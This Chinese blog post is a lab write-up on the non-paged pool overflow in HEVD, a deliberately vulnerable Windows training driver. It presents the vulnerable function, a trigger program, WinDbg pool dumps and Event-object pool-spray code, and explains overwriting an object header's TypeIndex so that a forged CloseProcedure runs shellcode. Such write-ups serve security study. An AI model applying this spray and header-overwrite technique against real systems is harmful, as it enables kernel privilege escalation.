<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="hevd windows内核漏洞练习-BUFFER_OVERFLOW_NON_PAGED_POOL1.漏洞分析非分页内存池溢出漏洞.">
<meta property="og:type" content="article">
<meta property="og:title" content="hevd windows内核漏洞练习-BUFFER_OVERFLOW_NON_PAGED_POOL">
<meta property="og:url" content="http://example.com/2023/07/16/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-BUFFER_OVERFLOW_NON_PAGED_POOL/index.html">
<meta property="og:site_name" content="Ash blog">
<meta property="og:description" content="hevd windows内核漏洞练习-BUFFER_OVERFLOW_NON_PAGED_POOL1.漏洞分析非分页内存池溢出漏洞.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2023/07/16/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-BUFFER_OVERFLOW_NON_PAGED_POOL/image-20230716200634261.png">
<meta property="og:image" content="http://example.com/2023/07/16/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-BUFFER_OVERFLOW_NON_PAGED_POOL/image-20230717114721324.png">
<meta property="article:published_time" content="2023-07-16T11:12:25.622Z">
<meta property="article:modified_time" content="2023-07-17T03:48:47.488Z">
<meta property="article:author" content="Ash">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/07/16/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-BUFFER_OVERFLOW_NON_PAGED_POOL/image-20230716200634261.png">

<link rel="canonical" href="http://example.com/2023/07/16/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-BUFFER_OVERFLOW_NON_PAGED_POOL/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>hevd windows内核漏洞练习-BUFFER_OVERFLOW_NON_PAGED_POOL | Ash blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ash blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/16/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-BUFFER_OVERFLOW_NON_PAGED_POOL/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ash">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ash blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          hevd windows内核漏洞练习-BUFFER_OVERFLOW_NON_PAGED_POOL
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-07-16 19:12:25" itemprop="dateCreated datePublished" datetime="2023-07-16T19:12:25+08:00">2023-07-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-07-17 11:48:47" itemprop="dateModified" datetime="2023-07-17T11:48:47+08:00">2023-07-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="hevd-windows内核漏洞练习-BUFFER-OVERFLOW-NON-PAGED-POOL"><a href="#hevd-windows内核漏洞练习-BUFFER-OVERFLOW-NON-PAGED-POOL" class="headerlink" title="hevd windows内核漏洞练习-BUFFER_OVERFLOW_NON_PAGED_POOL"></a>hevd windows内核漏洞练习-BUFFER_OVERFLOW_NON_PAGED_POOL</h1><h2 id="1-漏洞分析"><a href="#1-漏洞分析" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h2><p>非分页内存池溢出漏洞.</p>
<p>这里申请了长度为0x1f8长度的非分页内存池.然后将ring3传入的数据和size作为memcpy参数.</p>
<p>漏洞原因是未对size进行限制,memcpy存在溢出风险.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">TriggerBufferOverflowNonPagedPool</span><span class="params">(<span class="type">void</span> *UserBuffer, <span class="type">unsigned</span> <span class="type">int</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PVOID PoolWithTag; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Allocating Pool chunk\n&quot;</span>);</span><br><span class="line">  PoolWithTag = <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x1F8</span>u, <span class="string">&#x27;kcaH&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( PoolWithTag )</span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;NonPagedPool&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%X\n&quot;</span>, <span class="number">0x1F8</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="built_in">ProbeForRead</span>(UserBuffer, <span class="number">0x1F8</span>u, <span class="number">1u</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="number">0x1F8</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in NonPagedPool\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(PoolWithTag, UserBuffer, Size);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Freeing Pool chunk\n&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="built_in">ExFreePoolWithTag</span>(PoolWithTag, <span class="number">0x6B636148</span>u);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xC0000017</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><p>首先编写一个测试程序</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">BUFFER_OVERFLOW_NON_PAGED_POOL_test</span><span class="params">(HANDLE dev)</span> </span>&#123;</span><br><span class="line">	DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//0x1f8+28</span></span><br><span class="line">	CHAR buf[<span class="number">0x1f8</span>];</span><br><span class="line">	<span class="type">int</span> bufLen = <span class="number">0x1f8</span>;</span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="number">0x41</span>, <span class="number">0x1f8</span>);</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(dev, HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL, buf, bufLen, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwRet, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(dev);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>申请了0x1f8长度的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">[+] Allocating Pool chunk</span><br><span class="line">[+] Pool Tag: &#x27;kcaH&#x27;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x1F8</span><br><span class="line">[+] Pool Chunk: 0x885EEB08</span><br><span class="line">[+] UserBuffer: 0x002DF8CC</span><br><span class="line">[+] UserBuffer Size: 0x1F8</span><br><span class="line">[+] KernelBuffer: 0x885EEB08</span><br><span class="line">[+] KernelBuffer Size: 0x1F8</span><br><span class="line">[+] Triggering Buffer Overflow in NonPagedPool</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">HEVD!TriggerBufferOverflowNonPagedPool+0xf7:</span><br><span class="line">92fa2dc5 e812c4fbff      call    HEVD!memcpy (92f5f1dc)</span><br><span class="line">kd&gt; p</span><br><span class="line">HEVD!TriggerBufferOverflowNonPagedPool+0xfc:</span><br><span class="line">92fa2dca 688655fa92      push    offset HEVD! ?? ::NNGAKEGL::`string&#x27; (92fa5586)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用!pool命令查看当前内存池,这里要用旧版windbg,新版的有问题.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pool 0x885EEB08</span><br><span class="line">Pool page 885eeb08 region is Nonpaged pool</span><br><span class="line"> 885ee000 size:   b8 previous size:    0  (Allocated)  File (Protected)</span><br><span class="line"> 885ee0b8 size:   28 previous size:   b8  (Allocated)  VadS</span><br><span class="line"> 885ee0e0 size:    8 previous size:   28  (Free)       Vad </span><br><span class="line"> 885ee0e8 size:   40 previous size:    8  (Allocated)  Even (Protected)</span><br><span class="line"> 885ee128 size:   30 previous size:   40  (Allocated)  Io  </span><br><span class="line"> 885ee158 size:   90 previous size:   30  (Allocated)  Ntfx</span><br><span class="line"> 885ee1e8 size:   68 previous size:   90  (Allocated)  FMsl</span><br><span class="line"> 885ee250 size:   28 previous size:   68  (Allocated)  VadS</span><br><span class="line"> 885ee278 size:   40 previous size:   28  (Allocated)  Even (Protected)</span><br><span class="line"> 885ee2b8 size:   28 previous size:   40  (Allocated)  VadS</span><br><span class="line"> 885ee2e0 size:    8 previous size:   28  (Free)       smMd</span><br><span class="line"> 885ee2e8 size:   50 previous size:    8  (Allocated)  Muta (Protected)</span><br><span class="line"> 885ee338 size:   18 previous size:   50  (Allocated)  MmSi</span><br><span class="line"> 885ee350 size:   60 previous size:   18  (Allocated)  Muta (Protected)</span><br><span class="line"> 885ee3b0 size:   28 previous size:   60  (Allocated)  VadS</span><br><span class="line"> 885ee3d8 size:    8 previous size:   28  (Free)       smMd</span><br><span class="line"> 885ee3e0 size:   30 previous size:    8  (Allocated)  FOCX</span><br><span class="line"> 885ee410 size:  180 previous size:   30  (Allocated)  EtwG</span><br><span class="line"> 885ee590 size:   10 previous size:  180  (Free)       Wait</span><br><span class="line"> 885ee5a0 size:   30 previous size:   10  (Allocated)  Io  </span><br><span class="line"> 885ee5d0 size:   90 previous size:   30  (Allocated)  Ntfx</span><br><span class="line"> 885ee660 size:   78 previous size:   90  (Allocated)  EtwR (Protected)</span><br><span class="line"> 885ee6d8 size:   20 previous size:   78  (Free)       WmiG</span><br><span class="line"> 885ee6f8 size:   c8 previous size:   20  (Allocated)  Ntfx</span><br><span class="line"> 885ee7c0 size:   40 previous size:   c8  (Allocated)  Even (Protected)</span><br><span class="line"> 885ee800 size:   e8 previous size:   40  (Allocated)  WmiG (Protected)</span><br><span class="line"> 885ee8e8 size:   40 previous size:   e8  (Allocated)  Even (Protected)</span><br><span class="line"> 885ee928 size:    8 previous size:   40  (Free)       WmiG</span><br><span class="line"> 885ee930 size:   28 previous size:    8  (Allocated)  VadS</span><br><span class="line"> 885ee958 size:   b8 previous size:   28  (Allocated)  File (Protected)</span><br><span class="line"> 885eea10 size:   c8 previous size:   b8  (Allocated)  Ntfx</span><br><span class="line"> 885eead8 size:   28 previous size:   c8  (Free)       Io  </span><br><span class="line">*885eeb00 size:  200 previous size:   28  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> 885eed00 size:   68 previous size:  200  (Allocated)  Mdl </span><br><span class="line"> 885eed68 size:   c8 previous size:   68  (Allocated)  MiSc</span><br><span class="line"> 885eee30 size:   30 previous size:   c8  (Allocated)  FOCX</span><br><span class="line"> 885eee60 size:   70 previous size:   30  (Allocated)  FMfc</span><br><span class="line"> 885eeed0 size:   10 previous size:   70  (Free)       SeIf</span><br><span class="line"> 885eeee0 size:   68 previous size:   10  (Allocated)  FMsl</span><br><span class="line"> 885eef48 size:   b8 previous size:   68  (Allocated)  File (Protected)</span><br></pre></td></tr></table></figure>

<p>可以看到在数据之前还有8个字节的池头信息.</p>
<p>如果我们的数据超过了0x1f8长度,是会覆盖掉下个池的池头信息的,漏洞的利用也是通过覆盖池的信息实现的.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd 885eeb00 </span><br><span class="line">885eeb00  04400005 6b636148 41414141 41414141</span><br><span class="line">885eeb10  41414141 41414141 41414141 41414141</span><br><span class="line">885eeb20  41414141 41414141 41414141 41414141</span><br><span class="line">885eeb30  41414141 41414141 41414141 41414141</span><br><span class="line">885eeb40  41414141 41414141 41414141 41414141</span><br><span class="line">885eeb50  41414141 41414141 41414141 41414141</span><br><span class="line">885eeb60  41414141 41414141 41414141 41414141</span><br><span class="line">885eeb70  41414141 41414141 41414141 41414141</span><br><span class="line"></span><br><span class="line">kd&gt; dd 885eed00-4</span><br><span class="line">885eecfc  41414141 040d0040 206c644d 00000000</span><br><span class="line">885eed0c  000c0020 00000000 88592e10 88592000</span><br><span class="line">885eed1c  00000084 00000e10 0003dd92 0003da06</span><br><span class="line">885eed2c  0003da07 0003da08 0003da09 000193ca</span><br><span class="line">885eed3c  00000000 885eed40 885eed40 00040000</span><br><span class="line">885eed4c  00000000 1818000b 20206f49 885eee98</span><br><span class="line">885eed5c  00000000 00000000 00000000 0419000d</span><br><span class="line">885eed6c  6353694d 8e9818d8 8e9818d8 92800000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下面要做的工作就是控制内核中内存池的分配和释放,让tag:hack内存分配时可以分配到我们释放的内存,并且周围内存池也是可控的.</p>
<p>分配的内存的大小为0x1f8,加上池头信息刚好为0x200.</p>
<p>我们的申请的是非分页内存池,而windows中Event对象也是通过非分页内存池存储,event事件对象大小为0x40.</p>
<p>如果连续申请8个刚好为0x200.</p>
<p>所以通过event对象制造内存空洞,代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">VOID Spray_NonPagePool() &#123;</span><br><span class="line">	for (int i = 0; i &lt; 0x2000; i++) &#123;</span><br><span class="line">		spray_event[i] = CreateEventA(NULL, FALSE, FALSE, NULL);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for (int i = 0; i &lt; 0x2000; i += 9) &#123;</span><br><span class="line">		for (int j = 0; j &lt; 8; j++) &#123;</span><br><span class="line">			CloseHandle(spray_event[i + j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到hack内存成功的分配到了event对象之间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">[+] Allocating Pool chunk</span><br><span class="line">[+] Pool Tag: &#x27;kcaH&#x27;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x1F8</span><br><span class="line">[+] Pool Chunk: 0x86649848</span><br><span class="line">[+] UserBuffer: 0x001CF894</span><br><span class="line">[+] UserBuffer Size: 0x1F8</span><br><span class="line">[+] KernelBuffer: 0x86649848</span><br><span class="line">[+] KernelBuffer Size: 0x1F8</span><br><span class="line">[+] Triggering Buffer Overflow in NonPagedPool</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">HEVD!TriggerBufferOverflowNonPagedPool+0xf7:</span><br><span class="line">92fa2dc5 e812c4fbff      call    HEVD!memcpy (92f5f1dc)</span><br><span class="line">kd&gt; !pool 0x86649848</span><br><span class="line">Pool page 86649848 region is Nonpaged pool</span><br><span class="line"> 86649000 size:  2f8 previous size:    0  (Allocated)  usbp</span><br><span class="line"> 866492f8 size:   88 previous size:  2f8  (Free)       ....</span><br><span class="line"> 86649380 size:   40 previous size:   88  (Allocated)  Even (Protected)</span><br><span class="line"> 866493c0 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 866495c0 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 86649600 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 86649800 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line">*86649840 size:  200 previous size:   40  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> 86649a40 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 86649a80 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 86649c80 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 86649cc0 size:  200 previous size:   40  (Free)       Even</span><br><span class="line"> 86649ec0 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 86649f00 size:  100 previous size:   40  (Free)       Even</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>关于内核对象的结构</p>
<p> <img src="/2023/07/16/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-BUFFER_OVERFLOW_NON_PAGED_POOL/image-20230716200634261.png" alt="image-20230716200634261"></p>
<p>看下hack池下块,event池对象的OBJECT_HEADER结构,event对象的typeIndex值为0xc,需要覆盖掉的就是这个值,为什么要覆盖掉它呢.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd 86649a40 </span><br><span class="line">86649a40  04080040 ee657645 00000000 00000040</span><br><span class="line">86649a50  00000000 00000000 00000001 00000001</span><br><span class="line">86649a60  00000000 0008000c 881054c0 00000000</span><br><span class="line">86649a70  00040001 00000000 86649a78 86649a78</span><br><span class="line">86649a80  00400008 ee657645 86648a48 86649cc8</span><br><span class="line">86649a90  00000000 00000000 00000000 00000000</span><br><span class="line">86649aa0  00000000 00080001 00000000 00000000</span><br><span class="line">86649ab0  00040001 00000000 86649ab8 86649ab8</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_HEADER 86649a40+18</span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +0x000 PointerCount     : 0n1</span><br><span class="line">   +0x004 HandleCount      : 0n1</span><br><span class="line">   +0x004 NextToFree       : 0x00000001 Void</span><br><span class="line">   +0x008 Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +0x00c TypeIndex        : 0xc &#x27;&#x27;</span><br><span class="line">   +0x00d TraceFlags       : 0 &#x27;&#x27;</span><br><span class="line">   +0x00e InfoMask         : 0x8 &#x27;&#x27;</span><br><span class="line">   +0x00f Flags            : 0 &#x27;&#x27;</span><br><span class="line">   +0x010 ObjectCreateInfo : 0x881054c0 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +0x010 QuotaBlockCharged : 0x881054c0 Void</span><br><span class="line">   +0x014 SecurityDescriptor : (null) </span><br><span class="line">   +0x018 Body             : _QUAD</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>TypeIndex是个ObTypeIndexTable中的索引,event对象索引为c,对应的值是86409b50,在这个结构中,偏移为0x60的位置,有一个CloseProcedure的回调函数,会在被释放时调用.</p>
<p>ObTypeIndexTable里面索引为0处值是0,如果可以操纵0地址伪造一个_OBJECT_TYPE结构,将CloseProcedure的地址修改为我们的shellcode地址,然后将下个event对象头中typeIndex覆盖为0,其他值保持不变,就可以在对象释放时调用我们的shellcode.</p>
